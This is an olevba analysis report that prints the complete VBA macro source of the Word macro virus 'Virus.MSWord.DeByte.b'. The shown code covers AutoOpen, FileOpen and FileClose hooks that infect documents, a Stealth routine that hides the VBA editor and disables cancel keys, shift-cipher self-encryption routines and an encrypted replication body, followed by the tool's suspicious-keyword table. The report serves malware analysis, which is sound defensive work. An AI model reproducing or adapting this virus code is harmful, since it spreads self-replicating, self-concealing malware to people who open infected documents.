olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.DeByte.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.DeByte.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Autoopen.bas 
in file: Virus.MSWord.DeByte.b - OLE stream: 'Macros/VBA/autoopen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Autoopen()
 Call Criptor.decript
 Call i_n.i_n
 Call Criptor.cript
End Sub

-------------------------------------------------------------------------------
VBA MACRO FileClose.bas 
in file: Virus.MSWord.DeByte.b - OLE stream: 'Macros/VBA/Fileclose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub FileClose()
 virus_test = 21
 For Each VbComponent In ActiveDocument.VBProject.VBComponents
    On Error GoTo Vir_ok
    If VbComponent.Name = "Dead_Byte" Then virus_test = 54
 Next
 If virus_test = 54 Then GoTo Vir_ok
 Call I_d.I_d
Vir_ok:
 WordBasic.FileClose
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoClose.bas 
in file: Virus.MSWord.DeByte.b - OLE stream: 'Macros/VBA/autoclose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
 virus_test = 30
 For Each VbComponent In ActiveDocument.VBProject.VBComponents
    On Error GoTo Vir_ok
    If VbComponent.Name = "Dead_Byte" Then virus_test = 54
 Next
 If virus_test = 100 Then GoTo Vir_ok
 Call I_d.I_d
Vir_ok:
End Sub
-------------------------------------------------------------------------------
VBA MACRO I_d.bas 
in file: Virus.MSWord.DeByte.b - OLE stream: 'Macros/VBA/I_d'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Sub I_d()
Dim m(100)
Dim winda As String
Randomize (Timer)
winda = "                                                                           "
n = GetWindowsDirectory(winda, 255)
winda = Left$(winda, n)
min = 1: max = 11: z = 0
For i = 1 To max
    m(i) = 0
Next i
SS:
c = Int((max + min - 1) * Abs(Rnd) + min)
For i = 1 To max
    If c = m(i) Then c = 100
Next i
If c <> 100 Then: z = z + 1: m(z) = c
If z < max Then GoTo SS

For i = 1 To max
If m(i) = 1 Then ActiveDocument.VBProject.VBComponents.Import winda + "\winds1.sys"
If m(i) = 2 Then ActiveDocument.VBProject.VBComponents.Import winda + "\winds2.sys"
If m(i) = 3 Then ActiveDocument.VBProject.VBComponents.Import winda + "\winds3.sys"
If m(i) = 4 Then ActiveDocument.VBProject.VBComponents.Import winda + "\winds4.sys"
If m(i) = 5 Then ActiveDocument.VBProject.VBComponents.Import winda + "\winds5.sys"
If m(i) = 6 Then ActiveDocument.VBProject.VBComponents.Import winda + "\winds6.sys"
If m(i) = 7 Then ActiveDocument.VBProject.VBComponents.Import winda + "\winds7.sys"
If m(i) = 8 Then ActiveDocument.VBProject.VBComponents.Import winda + "\winds8.sys"
If m(i) = 9 Then ActiveDocument.VBProject.VBComponents.Import winda + "\winds9.sys"
If m(i) = 10 Then ActiveDocument.VBProject.VBComponents.Import winda + "\winds10.sys"
If m(i) = 11 Then ActiveDocument.VBProject.VBComponents.Import winda + "\winds11.sys"
Next i
ActiveDocument.VBProject.VBComponents("I_nc1").Name = "I_n"
ActiveDocument.SaveAs
End Sub

-------------------------------------------------------------------------------
VBA MACRO System.bas 
in file: Virus.MSWord.DeByte.b - OLE stream: 'Macros/VBA/System'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function GetUserName Lib "advapi32.dll" Alias "GetUserNameA" (ByVal lpBuffer As String, nSize As Long) As Long
Sub ViewVBCode(): Stealth: End Sub
Sub FileTemplates(): Stealth: End Sub
Sub ToolsMacro(): Stealth: End Sub
Private Sub Stealth()
 u_name$ = "         "
 b = GetUserName(u_name$, 101)
 On Error Resume Next
 If u_name$ <> "Dead_Byte" Then Application.ShowVisualBasicEditor = 0
 If u_name$ = "Dead_Byte" Then Application.ShowVisualBasicEditor = 1
 Application.EnableCancelKey = 0
End Sub


-------------------------------------------------------------------------------
VBA MACRO i_n.bas 
in file: Virus.MSWord.DeByte.b - OLE stream: 'Macros/VBA/i_n'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Sub i_n()
'Inr wnsif Fx Xywnsl
'wnsif B "                                                                           "
's B LjyWnsitwxInwjhytwy(wnsif, 255)
'wnsif B Qjky$(wnsif, s)
'yds B 1
'FhynvjIthzrjsy.VGUwtojhy.VGHtrutsjsyx("IjfidGyyj").Jxutwy wnsif + "awnsix1.xyx"
'FhynvjIthzrjsy.VGUwtojhy.VGHtrutsjsyx("KnqjTujs").Jxutwy wnsif + "awnsix2.xyx"
'FhynvjIthzrjsy.VGUwtojhy.VGHtrutsjsyx("FzytTujs").Jxutwy wnsif + "awnsix3.xyx"
'FhynvjIthzrjsy.VGUwtojhy.VGHtrutsjsyx("FzytHqtxj").Jxutwy wnsif + "awnsix4.xyx"
'FhynvjIthzrjsy.VGUwtojhy.VGHtrutsjsyx("KnqjHqtxj").Jxutwy wnsif + "awnsix5.xyx"
'FhynvjIthzrjsy.VGUwtojhy.VGHtrutsjsyx("Ndi").Jxutwy wnsif + "awnsix6.xyx"
'FhynvjIthzrjsy.VGUwtojhy.VGHtrutsjsyx("Ndsh").Jxutwy wnsif + "awnsix7.xyx"
'FhynvjIthzrjsy.VGUwtojhy.VGHtrutsjsyx("Xyxyjr").Jxutwy wnsif + "awnsix8.xyx"
'FhynvjIthzrjsy.VGUwtojhy.VGHtrutsjsyx("Ndsh").Jxutwy wnsif + "awnsix9.xyx"
'FhynvjIthzrjsy.VGUwtojhy.VGHtrutsjsyx("YRU").Jxutwy wnsif + "awnsix10.xyx"
'FhynvjIthzrjsy.VGUwtojhy.VGHtrutsjsyx("Hwnuytw").Jxutwy wnsif + "awnsix11.xyx"
'Ktw o B 1 Yt WtwiGfxnh.HtzsyRfhwtx(0, 0)
' Nk WtwiGfxnh.[RfhwtSfrj$b(o, 0, 0) B "IjfidGyyj" Ymjs yds B 100
'Sjxy o
'Nk yds B 100 Ymjs LtYt tp
'kdsfrj$ B WtwiGfxnh.[KnqjSfrj$b()
'WtwiGfxnh.RfhwtHtuy kdsfrj$ + ":IjfidGyyj", "Stwrfq:IjfidGyyj"
'WtwiGfxnh.RfhwtHtuy kdsfrj$ + ":KnqjTujs", "Stwrfq:KnqjTujs"
'WtwiGfxnh.RfhwtHtuy kdsfrj$ + ":KnqjHqtxj", "Stwrfq:KnqjHqtxj"
'WtwiGfxnh.RfhwtHtuy kdsfrj$ + ":FzytHqtxj", "Stwrfq:FzytHqtxj"
'WtwiGfxnh.RfhwtHtuy kdsfrj$ + ":Ndi", "Stwrfq:Ndi"
'WtwiGfxnh.RfhwtHtuy kdsfrj$ + ":Ndsh", "Stwrfq:Ndsh"
'WtwiGfxnh.RfhwtHtuy kdsfrj$ + ":YRU", "Stwrfq:YRU"
'WtwiGfxnh.RfhwtHtuy kdsfrj$ + ":Hwnuytw", "Stwrfq:Hwnuytw"
'WtwiGfxnh.RfhwtHtuy kdsfrj$ + ":Xyxyjr", "Stwrfq:Xyxyjr"
'tp:
End Sub



-------------------------------------------------------------------------------
VBA MACRO FileOpen.bas 
in file: Virus.MSWord.DeByte.b - OLE stream: 'Macros/VBA/FileOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub FileOpen()
virus_test = 21
dialog_test = Dialogs(wdDialogFileOpen).Show
If dialog_test = 0 Then GoTo Vir_ok
On Error GoTo Vir_ok
For Each VbComponent In ActiveDocument.VBProject.VBComponents
    On Error GoTo Vir_ok
    If VbComponent.Name = "Dead_Byte" Then virus_test = 54
Next
If virus_test = 54 Then GoTo Vir_ok
Call I_d.I_d
Vir_ok:
End Sub
-------------------------------------------------------------------------------
VBA MACRO Dead_Byte.bas 
in file: Virus.MSWord.DeByte.b - OLE stream: 'Macros/VBA/Dead_Byte'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Dead_Byte()
End Sub
-------------------------------------------------------------------------------
VBA MACRO Criptor.bas 
in file: Virus.MSWord.DeByte.b - OLE stream: 'Macros/VBA/Criptor'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub cript()
Set t = ActiveDocument.VBProject.VBComponents("I_n")
Set t_tmp = ActiveDocument.VBProject.VBComponents("TMP")
z$ = "%"
i = 3
l1:
 z$ = MacroContainer.VBProject.VBComponents("I_n").CodeModule.Lines(i, 1)
 z_tmp$ = MacroContainer.VBProject.VBComponents("TMP").CodeModule.Lines(i - 2, 1)
 If MacroContainer.VBProject.VBComponents("I_n").CodeModule.Lines(i + 1, 1) = "" Then GoTo l2
 nz$ = "'"
 nz_tmp$ = "'"
 For j = 1 To Len(z$)
  If (((Asc(Mid(z$, j, 1)) + 5) > 64) And ((Asc(Mid(z$, j, 1)) + 5) < 91)) Or (((Asc(Mid(z$, j, 1)) + 5) > 96) And ((Asc(Mid(z$, j, 1)) + 5) < 123)) Then
   nz$ = nz$ + Chr$(Asc(Mid(z$, j, 1)) + 5)
   nz_tmp$ = nz_tmp$ + "0"
  End If
  If ((Asc(Mid(z$, j, 1)) + 5) < 65) Or (((Asc(Mid(z$, j, 1)) + 5) > 90) And ((Asc(Mid(z$, j, 1)) + 5) < 97)) Or ((Asc(Mid(z$, j, 1)) + 5) > 122) Then
   nz$ = nz$ + Chr$(Asc(Mid(z$, j, 1)))
   nz_tmp$ = nz_tmp$ + "1"
  End If
 Next j
 zz = t.CodeModule.deletelines(i, 1)
 zz = t.CodeModule.InsertLines(i, nz$)
 'zz_tmp = t_tmp.CodeModule.InsertLines(i - 2, nz_tmp$)
 i = i + 1
GoTo l1
l2:
ActiveDocument.SaveAs
End Sub
Sub decript()
Set t = ActiveDocument.VBProject.VBComponents("I_n")
Set t_tmp = ActiveDocument.VBProject.VBComponents("TMP")
z$ = "%"
i = 3
l1:
 z$ = MacroContainer.VBProject.VBComponents("I_n").CodeModule.Lines(i, 1)
 z_tmp$ = MacroContainer.VBProject.VBComponents("TMP").CodeModule.Lines(i - 2, 1)
 If MacroContainer.VBProject.VBComponents("I_n").CodeModule.Lines(i + 1, 1) = "" Then GoTo l2
 nz$ = ""
 nz_tmp$ = ""
 For j = 2 To Len(z$)
  If Mid(z_tmp$, j, 1) = "0" Then
   nz$ = nz$ + Chr$(Asc(Mid(z$, j, 1)) - 5)
  End If
  If Mid(z_tmp$, j, 1) = "1" Then
   nz$ = nz$ + Mid(z$, j, 1)
  End If
 Next j
 zz = t.CodeModule.deletelines(i, 1) 'номер,кол-ко
 zz = t.CodeModule.InsertLines(i, nz$)
 i = i + 1
GoTo l1
l2:
'zz = t_tmp.CodeModule.deletelines(1, t_tmp.CodeModule.CountOfLines)
ActiveDocument.SaveAs
End Sub
-------------------------------------------------------------------------------
VBA MACRO TMP.bas 
in file: Virus.MSWord.DeByte.b - OLE stream: 'Macros/VBA/TMP'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'0001100001001000000
'1000010111111111111111111111111111111111111111111111111111111111111111111111111111111
'01010001000010000000001110000111111
'10000101000011100001101
'0001011
'0000100000000011000000001100000000000110000001001110100001100001111010000110101
'000010000000001100000000110000000000011000000001110100001100001111010000110101
'000010000000001100000000110000000000011000000001110100001100001111010000110101
'0000100000000011000000001100000000000110000000001110100001100001111010000110101
'0000100000000011000000001100000000000110000000001110100001100001111010000110101
'0000100000000011000000001100000000000110001110100001100001111010000110101
'00001000000000110000000011000000000001100001110100001100001111010000110101
'0000100000000011000000001100000000000110100001110100001100001111010000110101
'00001000000000110000000011000000000001100001110100001100001111010000110101
'00001000000000110000000011000000000001100011101000011000011110100001110101
'000010000000001100000000110000000000011000000011101000011000011110100001110101
'0001010111001100000000100000000000111111
'1001100000000110000000001010111111110110000001001100001000101111
'001010
'0010001011111000010000100
'000000110110000000011000000001011
'10000000010000000011000000111111000000100111100000010000001001
'100000000100000000110000001111110000000011110000001000000001
'10000000010000000011000000111111000000000111100000010000000001
'10000000010000000011000000111111000000000111100000010000000001
'10000000010000000011000000111111000111100000010001
'1000000001000000001100000011111100001111000000100001
'10000000010000000011000000111111000111100000010001
'1000000001000000001100000011111100000001111000000100000001
'10000000010000000011000000111111010000111100000010100001
'001
-------------------------------------------------------------------------------
VBA MACRO I_nc.bas 
in file: Virus.MSWord.DeByte.b - OLE stream: 'Macros/VBA/I_nc'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Sub i_n()
'Inr wnsif Fx Xywnsl
'wnsif B "                                                                           "
's B LjyWnsitwxInwjhytwy(wnsif, 255)
'wnsif B Qjky$(wnsif, s)
'yds B 1
'FhynvjIthzrjsy.VGUwtojhy.VGHtrutsjsyx("IjfidGyyj").Jxutwy wnsif + "awnsix1.xyx"
'FhynvjIthzrjsy.VGUwtojhy.VGHtrutsjsyx("KnqjTujs").Jxutwy wnsif + "awnsix2.xyx"
'FhynvjIthzrjsy.VGUwtojhy.VGHtrutsjsyx("FzytTujs").Jxutwy wnsif + "awnsix3.xyx"
'FhynvjIthzrjsy.VGUwtojhy.VGHtrutsjsyx("FzytHqtxj").Jxutwy wnsif + "awnsix4.xyx"
'FhynvjIthzrjsy.VGUwtojhy.VGHtrutsjsyx("KnqjHqtxj").Jxutwy wnsif + "awnsix5.xyx"
'FhynvjIthzrjsy.VGUwtojhy.VGHtrutsjsyx("Ndi").Jxutwy wnsif + "awnsix6.xyx"
'FhynvjIthzrjsy.VGUwtojhy.VGHtrutsjsyx("Ndsh").Jxutwy wnsif + "awnsix7.xyx"
'FhynvjIthzrjsy.VGUwtojhy.VGHtrutsjsyx("Xyxyjr").Jxutwy wnsif + "awnsix8.xyx"
'FhynvjIthzrjsy.VGUwtojhy.VGHtrutsjsyx("Ndsh").Jxutwy wnsif + "awnsix9.xyx"
'FhynvjIthzrjsy.VGUwtojhy.VGHtrutsjsyx("YRU").Jxutwy wnsif + "awnsix10.xyx"
'FhynvjIthzrjsy.VGUwtojhy.VGHtrutsjsyx("Hwnuytw").Jxutwy wnsif + "awnsix11.xyx"
'Ktw o B 1 Yt WtwiGfxnh.HtzsyRfhwtx(0, 0)
' Nk WtwiGfxnh.[RfhwtSfrj$b(o, 0, 0) B "IjfidGyyj" Ymjs yds B 100
'Sjxy o
'Nk yds B 100 Ymjs LtYt tp
'kdsfrj$ B WtwiGfxnh.[KnqjSfrj$b()
'WtwiGfxnh.RfhwtHtuy kdsfrj$ + ":IjfidGyyj", "Stwrfq:IjfidGyyj"
'WtwiGfxnh.RfhwtHtuy kdsfrj$ + ":KnqjTujs", "Stwrfq:KnqjTujs"
'WtwiGfxnh.RfhwtHtuy kdsfrj$ + ":KnqjHqtxj", "Stwrfq:KnqjHqtxj"
'WtwiGfxnh.RfhwtHtuy kdsfrj$ + ":FzytHqtxj", "Stwrfq:FzytHqtxj"
'WtwiGfxnh.RfhwtHtuy kdsfrj$ + ":Ndi", "Stwrfq:Ndi"
'WtwiGfxnh.RfhwtHtuy kdsfrj$ + ":Ndsh", "Stwrfq:Ndsh"
'WtwiGfxnh.RfhwtHtuy kdsfrj$ + ":YRU", "Stwrfq:YRU"
'WtwiGfxnh.RfhwtHtuy kdsfrj$ + ":Hwnuytw", "Stwrfq:Hwnuytw"
'WtwiGfxnh.RfhwtHtuy kdsfrj$ + ":Xyxyjr", "Stwrfq:Xyxyjr"
'tp:
End Sub




+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoopen            |Runs when the Word document is opened        |
|AutoExec  |autoclose           |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |advapi32.dll        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

